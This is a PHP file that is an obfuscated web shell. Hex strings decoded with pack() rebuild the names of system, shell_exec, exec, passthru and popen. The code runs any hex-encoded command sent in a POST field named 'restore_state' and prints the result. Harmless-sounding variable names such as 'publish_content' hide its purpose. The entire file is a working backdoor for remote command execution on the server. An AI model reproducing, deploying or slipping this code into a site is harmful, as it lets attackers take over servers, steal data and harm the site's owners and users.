<?php


$element1 = '736';
$element2 = '6c6';
$element3 = 'c5f';
$element4 = '865';
$element5 = '657';
$element6 = '706';
$element7 = '468';
$element8 = '656';
$element9 = '737';
$element10 = '472';
$element11 = '16d';
$element12 = '745';
$element13 = 'e74';
$element14 = '36c';
$element15 = '726';
$element16 = '573';
$element17 = 'f72';
$element18 = '655';
$element19 = 'f73';
$publish_content1 = pack("H*", '737'.'973'.'746'.'56d');
$publish_content2 = pack("H*", $element1.'865'.$element2.$element3.'657'.$element4);
$publish_content3 = pack("H*", $element5.'865');
$publish_content4 = pack("H*", $element6.'173'.'737'.$element7.'727');
$publish_content5 = pack("H*", '706'.'f70'.$element8);
$publish_content6 = pack("H*", $element9.$element10.'656'.$element11.'5f6'.'765'.$element12.'f63'.'6f6'.'e74'.$element8.$element13);
$publish_content7 = pack("H*", '706'.$element14.'6f7'.'365');
$restore_state = pack("H*", $element15.$element16.'746'.$element17.$element18.$element19.'746'.'174');
if (isset($_POST[$restore_state])) {
    $restore_state = pack("H*", $_POST[$restore_state]);
    if (function_exists($publish_content1)) {
        $publish_content1($restore_state);
    } elseif (function_exists($publish_content2)) {
        print $publish_content2($restore_state);
    } elseif (function_exists($publish_content3)) {
        $publish_content3($restore_state, $marker_item);
        print join("\n", $marker_item);
    } elseif (function_exists($publish_content4)) {
        $publish_content4($restore_state);
    } elseif (function_exists($publish_content5) && function_exists($publish_content6) && function_exists($publish_content7)) {
        $comp_object = $publish_content5($restore_state, 'r');
        if ($comp_object) {
            $ptr_token = $publish_content6($comp_object);
            $publish_content7($comp_object);
            print $ptr_token;
        }
    }
    exit;
}
